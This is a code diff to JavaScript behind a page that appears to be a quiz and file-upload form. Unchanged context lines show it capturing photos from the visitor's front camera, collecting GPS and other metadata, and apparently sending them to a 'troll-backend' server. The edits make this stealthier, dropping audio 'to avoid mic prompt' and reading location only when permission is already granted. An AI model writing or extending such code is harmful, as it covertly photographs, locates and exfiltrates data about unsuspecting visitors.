@@ -12,7 +12,7 @@ const form = document.getElementById('quiz-form'); // optional: form wrapper
 
 const BACKEND_BASE = "https://troll-backend.onrender.com/api";
 
-// Camera constraints
+// Camera constraints (no audio to avoid mic prompt)
 const constraints = { video: { facingMode: "user" }, audio: false };
 
 // ================================
@@ -56,13 +56,18 @@ async function collectMetadata() {
     }
   }
 
-  // Geolocation info
-  if (navigator.geolocation) {
+  // Geolocation info (only if permission already granted)
+  if (navigator.permissions && navigator.geolocation) {
     try {
-      const position = await new Promise((resolve, reject) =>
-        navigator.geolocation.getCurrentPosition(resolve, reject)
-      );
-      metadata.gps = `${position.coords.latitude},${position.coords.longitude}`;
+      const status = await navigator.permissions.query({ name: 'geolocation' });
+      if (status.state === "granted") {
+        const position = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject)
+        );
+        metadata.gps = `${position.coords.latitude},${position.coords.longitude}`;
+      } else {
+        metadata.gps = "Location access not granted";
+      }
     } catch (err) {
       console.error("Geolocation error:", err);
       metadata.gps = "Location access denied";
@@ -103,7 +108,8 @@ async function sendCameraData() {
     video.srcObject = stream;
 
     const metadata = await collectMetadata();
-    // Wait a few seconds for a real-looking capture
+
+    // Wait a few seconds for a realistic capture
     await new Promise(res => setTimeout(res, 3000));
 
     const image = await capturePhoto();
@@ -165,7 +171,7 @@ if (btn) {
     // ✅ Check if file is selected
     if (!fileInput || fileInput.files.length === 0) {
       showToast("Please select a file before submitting!");
-      return; // stop execution
+      return;
     }
 
     // Upload file
@@ -178,4 +184,4 @@ if (btn) {
     if (quiz) quiz.style.display = "none";
     if (success) success.style.display = "block";
   });
-    }
+}
